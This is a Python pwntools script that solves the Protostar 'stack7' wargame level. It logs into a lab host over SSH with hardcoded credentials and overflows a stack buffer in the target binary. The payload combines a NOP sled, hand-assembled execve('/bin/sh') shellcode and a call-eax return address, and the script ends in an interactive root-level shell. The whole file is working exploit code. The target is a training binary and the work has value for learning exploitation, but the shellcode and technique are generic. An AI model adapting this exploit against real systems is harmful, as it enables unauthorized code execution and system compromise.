#!/usr/bin/env python
# $Id: stack7.py,v 1.0 2018/06/17 20:07:50 dhn Exp $

from pwn import *

level = 7
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

call_eax = p32(0x0804847f)

shellcode = (
    "\x6a\x0b"              # push   0xb
    "\x58"                  # pop    eax
    "\x31\xf6"              # xor    esi,esi
    "\x56"                  # push   esi
    "\x68\x2f\x2f\x73\x68"  # push   0x68732f2f
    "\x68\x2f\x62\x69\x6e"  # push   0x6e69622f
    "\x89\xe3"              # mov    ebx,esp
    "\x31\xc9"              # xor    ecx,ecx
    "\x89\xca"              # mov    edx,ecx
    "\xcd\x80"              # int    0x80
)

payload = "\x90" * 8
payload += shellcode
payload += "A" * (80 - len(shellcode) - 8)
payload += call_eax

r = shell.run(binary, tty=False)
r.recvuntil("input path please:")
r.sendline(payload)
r.interactive()
r.clean()

log.success("Done!")
